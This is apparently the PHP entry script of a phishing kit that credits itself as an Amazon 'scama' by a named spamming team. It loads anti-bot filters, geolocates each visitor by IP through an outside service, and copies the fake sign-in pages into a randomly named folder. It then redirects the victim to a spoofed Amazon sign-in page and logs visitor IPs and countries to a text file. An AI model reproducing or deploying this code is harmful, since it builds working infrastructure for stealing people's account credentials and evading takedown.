<?php
session_start();
error_reporting(0);

include "./secure/antibots/antibots1.php";
include "./secure/antibots/antibots2.php";
/*   
       #===========================================#
       #   scama: Amazon Crew                      #
       #   Team : Dreamhackers                     #
       #   mode : in Moroccan spamer               #
       #   creat : dexter & Patrick & Yassin       #
       #   web : www.facebook.com/dreamdeface.org  #     
       #===========================================#

   Please Don't Talk About Me When I'm Gone Alfred Publishing 
   Please don't forget to click save 
							                         
*/

$remote  = @$_SERVER['REMOTE_ADDR'];
$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$remote"));
if($ip_data && $ip_data->geoplugin_countryCode != null){
  $dexter = $ip_data->geoplugin_countryCode;
}   $random=rand(1,500);
    $md5=md5($random);
    $result = substr($md5,0,6.7); 
	$base=base64_encode($result);
	$dst= $result . $base . $result;
	function recurse_copy($src,$dst) {
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
	if (( $file != '.' ) && ( $file != '..' )) {
	if ( is_dir($src . '/' . $file) ) {
	recurse_copy($src . '/' . $file,$dst . '/' . $file);
	}
	else {
	copy($src . '/' . $file,$dst . '/' . $file);
	}}}
	closedir($dir);
	}
$src="./secure/";
recurse_copy( $src, $dst );
$haxor = "./$dst/signin.php?country=".$dexter."&id=".md5(microtime())."&dispatch=".sha1(microtime())."";	
header("location:$haxor");
$ip = getenv("REMOTE_ADDR");
$file = fopen("clonox.txt","a");
fwrite($file,$ip." - $dexter - ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\r\n");
?>
   
